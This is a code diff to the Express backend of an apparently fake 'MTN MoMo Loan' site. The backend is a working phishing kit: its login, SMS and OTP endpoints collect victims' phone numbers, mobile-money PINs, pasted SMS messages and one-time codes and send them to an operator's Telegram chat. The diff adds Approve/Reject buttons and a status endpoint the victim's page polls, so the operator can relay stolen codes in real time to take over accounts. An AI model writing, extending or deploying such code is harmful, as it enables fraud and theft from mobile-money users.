@@ -1,8 +1,8 @@
 /* ============================================================
    MTN MoMo Loan — Backend
-   - Stateless
-   - Forwards login / SMS / OTP events to Telegram
-   - No DB, no PIN storage
+   - Live approve/reject via Telegram inline buttons
+   - Frontend polls status endpoint
+   - No DB (in-memory Map, auto-cleaned)
    - Fallback port: 5000 (Railway overrides via process.env.PORT)
    ============================================================ */
 
@@ -20,7 +20,47 @@ const PORT = process.env.PORT || 5000;
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '';
 
-const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+const TELEGRAM_API          = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+const TELEGRAM_ANSWER_URL   = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
+const TELEGRAM_EDIT_URL     = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
+const TELEGRAM_WEBHOOK_URL  = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook`;
+
+/* Approval timeout: 10 minutes */
+const SESSION_TIMEOUT_MS = 10 * 60 * 1000;
+/* Cleanup interval: every 60 seconds, purge sessions older than 15 min */
+const SESSION_MAX_AGE_MS = 15 * 60 * 1000;
+
+/* ============================================================
+   IN-MEMORY SESSION STORE
+   Map<sessionId, {
+     step: 'login' | 'sms' | 'otp',
+     status: 'pending' | 'approved' | 'rejected' | 'timeout',
+     data: {...},
+     createdAt: number,
+     resolvedAt: number | null,
+     telegramMessageId: number | null
+   }>
+   ============================================================ */
+const sessions = new Map();
+
+/* Auto-cleanup */
+setInterval(() => {
+  const now = Date.now();
+  for (const [id, s] of sessions.entries()) {
+    const age = now - s.createdAt;
+
+    /* Mark pending sessions as timeout after SESSION_TIMEOUT_MS */
+    if (s.status === 'pending' && age > SESSION_TIMEOUT_MS) {
+      s.status = 'timeout';
+      s.resolvedAt = now;
+    }
+
+    /* Delete very old sessions */
+    if (age > SESSION_MAX_AGE_MS) {
+      sessions.delete(id);
+    }
+  }
+}, 60 * 1000);
 
 /* ============================================================
    MIDDLEWARE
@@ -29,7 +69,6 @@ app.use(cors());
 app.use(express.json({ limit: '1mb' }));
 app.use(express.urlencoded({ extended: true }));
 
-/* Simple request log */
 app.use((req, _res, next) => {
   console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
   next();
@@ -38,6 +77,10 @@ app.use((req, _res, next) => {
 /* ============================================================
    HELPERS
    ============================================================ */
+function makeSessionId() {
+  return crypto.randomBytes(16).toString('hex');
+}
+
 function makeReference(prefix = 'REF') {
   const stamp = Date.now().toString(36).toUpperCase();
   const rand = crypto.randomBytes(3).toString('hex').toUpperCase();
@@ -55,10 +98,17 @@ function escapeHtml(s = '') {
     .replace(/>/g, '&gt;');
 }
 
-async function sendTelegram(text) {
+function isValidPhone(phone) {
+  return typeof phone === 'string' && /^\+?\d{8,15}$/.test(phone.replace(/\s/g, ''));
+}
+
+/* ============================================================
+   TELEGRAM — send message with inline keyboard
+   ============================================================ */
+async function sendTelegramWithButtons(text, sessionId, step) {
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
     console.warn('⚠️ Telegram env vars missing — message not sent.');
-    return { ok: false, reason: 'missing_env' };
+    return null;
   }
   try {
     const res = await fetch(TELEGRAM_API, {
@@ -68,24 +118,61 @@ async function sendTelegram(text) {
         chat_id: TELEGRAM_CHAT_ID,
         text,
         parse_mode: 'HTML',
-        disable_web_page_preview: true
+        disable_web_page_preview: true,
+        reply_markup: {
+          inline_keyboard: [[
+            { text: '✅ Approve', callback_data: `approve:${step}:${sessionId}` },
+            { text: '❌ Reject',  callback_data: `reject:${step}:${sessionId}` }
+          ]]
+        }
       })
     });
     const data = await res.json().catch(() => ({}));
     if (!data.ok) {
       console.warn('⚠️ Telegram error:', data.description || data);
-      return { ok: false, reason: data.description || 'telegram_error' };
+      return null;
     }
-    return { ok: true };
+    return data.result.message_id || null;
   } catch (err) {
     console.error('❌ Telegram fetch failed:', err.message);
-    return { ok: false, reason: err.message };
+    return null;
   }
 }
 
-/* Basic validation */
-function isValidPhone(phone) {
-  return typeof phone === 'string' && /^\+?\d{8,15}$/.test(phone.replace(/\s/g, ''));
+async function editTelegramMessage(messageId, text) {
+  if (!messageId || !TELEGRAM_BOT_TOKEN) return;
+  try {
+    await fetch(TELEGRAM_EDIT_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        message_id: messageId,
+        text,
+        parse_mode: 'HTML',
+        disable_web_page_preview: true
+      })
+    });
+  } catch (err) {
+    console.error('editTelegramMessage failed:', err.message);
+  }
+}
+
+async function answerCallback(callbackQueryId, text) {
+  if (!callbackQueryId || !TELEGRAM_BOT_TOKEN) return;
+  try {
+    await fetch(TELEGRAM_ANSWER_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        callback_query_id: callbackQueryId,
+        text,
+        show_alert: false
+      })
+    });
+  } catch (err) {
+    console.error('answerCallback failed:', err.message);
+  }
 }
 
 /* ============================================================
@@ -95,18 +182,19 @@ app.get('/', (_req, res) => {
   res.json({
     ok: true,
     service: 'momo-usersey-backend',
+    activeSessions: sessions.size,
     time: new Date().toISOString()
   });
 });
 
 /* ============================================================
    POST /api/login
-   Body: { phone, pin }
-   Response: { ok: true, token }
+   Body: { phone, pin, country? }
+   Response: { ok: true, sessionId, token }
    ============================================================ */
 app.post('/api/login', async (req, res) => {
   try {
-    const { phone = '', pin = '' } = req.body || {};
+    const { phone = '', pin = '', country = 'CM' } = req.body || {};
 
     if (!isValidPhone(phone)) {
       return res.status(400).json({ ok: false, error: 'Invalid phone number' });
@@ -115,19 +203,31 @@ app.post('/api/login', async (req, res) => {
       return res.status(400).json({ ok: false, error: 'Invalid PIN' });
     }
 
+    const sessionId = makeSessionId();
     const token = makeToken();
 
-    const message =
-      `🔐 <b>MoMo Login Attempt</b>\n` +
+    const text =
+      `🔐 <b>MoMo Login — Awaiting Approval</b>\n` +
       `━━━━━━━━━━━━━━━━━━\n` +
       `📱 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
+      `🌍 <b>Country:</b> ${escapeHtml(country)}\n` +
       `🔑 <b>PIN:</b> <code>${escapeHtml(pin)}</code>\n` +
       `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' })}\n` +
-      `🌍 <b>IP:</b> <code>${escapeHtml(req.ip || 'unknown')}</code>`;
+      `🌐 <b>IP:</b> <code>${escapeHtml(req.ip || 'unknown')}</code>\n\n` +
+      `⏳ Tap ✅ or ❌ below`;
 
-    await sendTelegram(message);
+    const messageId = await sendTelegramWithButtons(text, sessionId, 'login');
 
-    return res.json({ ok: true, token });
+    sessions.set(sessionId, {
+      step: 'login',
+      status: 'pending',
+      data: { phone, country, token },
+      createdAt: Date.now(),
+      resolvedAt: null,
+      telegramMessageId: messageId
+    });
+
+    return res.json({ ok: true, sessionId, token });
   } catch (err) {
     console.error('login error:', err);
     return res.status(500).json({ ok: false, error: 'Server error' });
@@ -137,7 +237,7 @@ app.post('/api/login', async (req, res) => {
 /* ============================================================
    POST /api/sms
    Body: { phone, token, sms }
-   Response: { ok: true, reference }
+   Response: { ok: true, sessionId, reference }
    ============================================================ */
 app.post('/api/sms', async (req, res) => {
   try {
@@ -150,19 +250,30 @@ app.post('/api/sms', async (req, res) => {
       return res.status(400).json({ ok: false, error: 'SMS text required' });
     }
 
+    const sessionId = makeSessionId();
     const reference = makeReference('SMS');
 
-    const message =
-      `📩 <b>Pasted SMS</b>\n` +
+    const text =
+      `📩 <b>Pasted SMS — Awaiting Approval</b>\n` +
       `━━━━━━━━━━━━━━━━━━\n` +
       `📱 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
       `🆔 <b>Ref:</b> <code>${reference}</code>\n` +
       `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' })}\n\n` +
-      `📝 <b>Message:</b>\n<pre>${escapeHtml(sms)}</pre>`;
+      `📝 <b>Message:</b>\n<pre>${escapeHtml(sms)}</pre>\n` +
+      `⏳ Tap ✅ or ❌ below`;
 
-    await sendTelegram(message);
+    const messageId = await sendTelegramWithButtons(text, sessionId, 'sms');
 
-    return res.json({ ok: true, reference });
+    sessions.set(sessionId, {
+      step: 'sms',
+      status: 'pending',
+      data: { phone, token, sms, reference },
+      createdAt: Date.now(),
+      resolvedAt: null,
+      telegramMessageId: messageId
+    });
+
+    return res.json({ ok: true, sessionId, reference });
   } catch (err) {
     console.error('sms error:', err);
     return res.status(500).json({ ok: false, error: 'Server error' });
@@ -172,7 +283,7 @@ app.post('/api/sms', async (req, res) => {
 /* ============================================================
    POST /api/verify-otp
    Body: { phone, otp, sms, token }
-   Response: { ok: true, reference }
+   Response: { ok: true, sessionId, reference }
    ============================================================ */
 app.post('/api/verify-otp', async (req, res) => {
   try {
@@ -185,20 +296,31 @@ app.post('/api/verify-otp', async (req, res) => {
       return res.status(400).json({ ok: false, error: 'Invalid OTP' });
     }
 
+    const sessionId = makeSessionId();
     const reference = makeReference('OTP');
 
-    const message =
-      `✅ <b>OTP Verified</b>\n` +
+    const text =
+      `🔢 <b>OTP Entered — Awaiting Approval</b>\n` +
       `━━━━━━━━━━━━━━━━━━\n` +
       `📱 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
       `🔢 <b>OTP:</b> <code>${escapeHtml(otp)}</code>\n` +
       `🆔 <b>Ref:</b> <code>${reference}</code>\n` +
       `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' })}` +
-      (sms ? `\n\n📝 <b>Linked SMS:</b>\n<pre>${escapeHtml(sms.slice(0, 400))}</pre>` : '');
+      (sms ? `\n\n📝 <b>Linked SMS:</b>\n<pre>${escapeHtml(sms.slice(0, 400))}</pre>` : '') +
+      `\n⏳ Tap ✅ or ❌ below`;
 
-    await sendTelegram(message);
+    const messageId = await sendTelegramWithButtons(text, sessionId, 'otp');
 
-    return res.json({ ok: true, reference });
+    sessions.set(sessionId, {
+      step: 'otp',
+      status: 'pending',
+      data: { phone, otp, sms, reference },
+      createdAt: Date.now(),
+      resolvedAt: null,
+      telegramMessageId: messageId
+    });
+
+    return res.json({ ok: true, sessionId, reference });
   } catch (err) {
     console.error('verify-otp error:', err);
     return res.status(500).json({ ok: false, error: 'Server error' });
@@ -218,18 +340,115 @@ app.post('/api/resend-sms', async (req, res) => {
       return res.status(400).json({ ok: false, error: 'Invalid phone number' });
     }
 
-    const message =
+    const text =
       `🔁 <b>SMS Resend Requested</b>\n` +
       `━━━━━━━━━━━━━━━━━━\n` +
       `📱 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
       `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' })}`;
 
-    await sendTelegram(message);
+    /* Just notify — no approval needed for resend */
+    await sendTelegramWithButtons(text, 'noop', 'noop');
 
     return res.json({ ok: true });
   } catch (err) {
     console.error('resend-sms error:', err);
     return res.status(500).json({ ok: false, error: 'Server error' });
+  }
+});
+
+/* ============================================================
+   GET /api/status/:sessionId
+   Response: { ok: true, status: 'pending'|'approved'|'rejected'|'timeout', step }
+   Frontend polls this every 2.5 seconds
+   ============================================================ */
+app.get('/api/status/:sessionId', (req, res) => {
+  const { sessionId } = req.params;
+  const session = sessions.get(sessionId);
+
+  if (!session) {
+    return res.json({ ok: true, status: 'unknown', step: null });
+  }
+
+  /* Check timeout on-demand too */
+  if (session.status === 'pending' && Date.now() - session.createdAt > SESSION_TIMEOUT_MS) {
+    session.status = 'timeout';
+    session.resolvedAt = Date.now();
+  }
+
+  return res.json({
+    ok: true,
+    status: session.status,
+    step: session.step
+  });
+});
+
+/* ============================================================
+   POST /api/telegram-webhook
+   Receives Telegram callback_query (button taps)
+   ============================================================ */
+app.post('/api/telegram-webhook', async (req, res) => {
+  try {
+    const update = req.body || {};
+    const cb = update.callback_query;
+
+    if (!cb || !cb.data) {
+      return res.json({ ok: true });
+    }
+
+    const [action, step, sessionId] = String(cb.data).split(':');
+    const session = sessions.get(sessionId);
+
+    if (!session) {
+      await answerCallback(cb.id, 'Session expired');
+      return res.json({ ok: true });
+    }
+
+    if (session.status !== 'pending') {
+      await answerCallback(cb.id, `Already ${session.status}`);
+      return res.json({ ok: true });
+    }
+
+    if (action === 'approve') {
+      session.status = 'approved';
+      session.resolvedAt = Date.now();
+      await answerCallback(cb.id, '✅ Approved');
+    } else if (action === 'reject') {
+      session.status = 'rejected';
+      session.resolvedAt = Date.now();
+      await answerCallback(cb.id, '❌ Rejected');
+    } else {
+      await answerCallback(cb.id, 'Unknown action');
+      return res.json({ ok: true });
+    }
+
+    /* Edit the original Telegram message to show the decision */
+    const statusLine = action === 'approve' ? '✅ <b>APPROVED</b>' : '❌ <b>REJECTED</b>';
+    const when = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' });
+
+    /* Rebuild original text (shortened) */
+    let summary = '';
+    if (session.step === 'login') {
+      summary = `📱 ${escapeHtml(session.data.phone)} — PIN entered`;
+    } else if (session.step === 'sms') {
+      summary = `📱 ${escapeHtml(session.data.phone)} — SMS pasted`;
+    } else if (session.step === 'otp') {
+      summary = `📱 ${escapeHtml(session.data.phone)} — OTP ${escapeHtml(session.data.otp)}`;
+    }
+
+    const newText =
+      `${statusLine}\n` +
+      `━━━━━━━━━━━━━━━━━━\n` +
+      `${summary}\n` +
+      `🕒 <b>Resolved:</b> ${when}`;
+
+    if (session.telegramMessageId) {
+      await editTelegramMessage(session.telegramMessageId, newText);
+    }
+
+    return res.json({ ok: true });
+  } catch (err) {
+    console.error('webhook error:', err);
+    return res.json({ ok: true });
   }
 });
 
@@ -246,12 +465,59 @@ app.use((err, _req, res, _next) => {
 });
 
 /* ============================================================
+   AUTO-REGISTER TELEGRAM WEBHOOK ON START
+   ============================================================ */
+async function registerWebhook() {
+  if (!TELEGRAM_BOT_TOKEN) {
+    console.warn('⚠️ Cannot register webhook — TELEGRAM_BOT_TOKEN missing');
+    return;
+  }
+
+  /* Railway gives us a public URL via env or we derive it */
+  const publicUrl =
+    process.env.PUBLIC_URL ||
+    process.env.RAILWAY_PUBLIC_DOMAIN
+      ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`
+      : null;
+
+  if (!publicUrl) {
+    console.warn('⚠️ Cannot register webhook — no PUBLIC_URL / RAILWAY_PUBLIC_DOMAIN set');
+    console.warn('   Set PUBLIC_URL=https://your-app.up.railway.app in env vars.');
+    return;
+  }
+
+  const webhookUrl = `${publicUrl}/api/telegram-webhook`;
+
+  try {
+    const res = await fetch(TELEGRAM_WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        url: webhookUrl,
+        allowed_updates: ['callback_query']
+      })
+    });
+    const data = await res.json().catch(() => ({}));
+    if (data.ok) {
+      console.log('✅ Telegram webhook registered:', webhookUrl);
+    } else {
+      console.warn('⚠️ Webhook registration failed:', data.description || data);
+    }
+  } catch (err) {
+    console.error('❌ Webhook registration error:', err.message);
+  }
+}
+
+/* ============================================================
    START
    ============================================================ */
-app.listen(PORT, () => {
+app.listen(PORT, async () => {
   console.log('====================================');
   console.log('💰 MTN MoMo Loan — backend running');
   console.log(`🚀 Port: ${PORT}`);
-  console.log(`📨 Telegram configured: ${TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? 'YES' : 'NO — set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID'}`);
+  console.log(`📨 Telegram configured: ${TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? 'YES' : 'NO'}`);
   console.log('====================================');
+
+  /* Register webhook after startup (wait 2s so Railway is fully up) */
+  setTimeout(registerWebhook, 2000);
 });
